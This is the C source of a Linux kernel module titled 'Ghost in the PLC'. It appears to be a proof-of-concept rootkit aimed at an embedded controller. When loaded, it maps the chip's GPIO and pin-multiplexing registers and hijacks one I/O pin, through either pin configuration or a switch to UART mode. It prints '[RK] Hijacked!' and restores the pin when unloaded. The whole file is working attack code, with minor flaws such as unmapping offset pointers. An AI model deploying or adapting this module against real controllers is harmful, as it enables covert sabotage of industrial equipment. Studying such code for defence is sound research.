#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/io.h>

// Pin 97 = pin 1 of bank 4
#define PIN_NUMBER 	1
#define BLOCK_SIZE 	4096

// For pin configuration
#define GPIO4_BASE 	0x49054000
#define PINCONF_REG	0x00000034

// For pin multiplexing
#define MUXPAD_BASE	0x48002000
#define PINMUX_REG 	0x000001E8

#define GPIO_MUX   	0x4 // 100
#define UART_MUX    	0x2 // 010

// MUXMODE for r[15:0]
#define MUXMODE_L(r, m) do {	\
	(r) &= ~(7);        	\
	(r) |= (m);         	\
} while (0)

// MUXMODE for r[31:16]
#define MUXMODE_H(r, m) do {	\
	(r) &= ~(7 << 16);  	\
	(r) |= ((m) << 16); 	\
} while (0)

volatile unsigned* gpio;
volatile unsigned* mux;

int __init init_module(void) {
	int res = 0;

	gpio = ioremap(GPIO4_BASE, BLOCK_SIZE);
	if (IS_ERR((void*)gpio)) {
		res = PTR_ERR((void*)gpio);
		goto iomap_gpio;
	}

	mux = ioremap(MUXPAD_BASE, BLOCK_SIZE);
	if (IS_ERR((void*)mux)) {
		res = PTR_ERR((void*)mux);
		goto iomap_mux;
	}

	// Point to pin configuration register
	gpio += (PINCONF_REG / sizeof(unsigned));

	// Point to pin multiplexing register
	mux += (PINMUX_REG / sizeof(unsigned));

	// Toggle comments to choose attack type
	// The effect is the same
	//MUXMODE_H(*mux, UART_MUX); // Do pin multiplexing
	(*gpio) |= (1 << PIN_NUMBER); // Do pin configuration

	printk(KERN_INFO "[RK] Hijacked!\n");

iomap_mux:
	iounmap(gpio);
iomap_gpio:
	return res;
}

void __exit cleanup_module(void) {
	// Toggle the corresponding comment
	// to undo the attack
	(*gpio) &= ~((unsigned)(1 << PIN_NUMBER)); // Reset pin configuration
	//MUXMODE_H(*mux, GPIO_MUX); // Reset pin multiplexing
	iounmap(mux);
	iounmap(gpio);
	printk(KERN_INFO "[RK] Exit\n");
}

MODULE_AUTHOR("tu4st");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Ghost in the PLC");
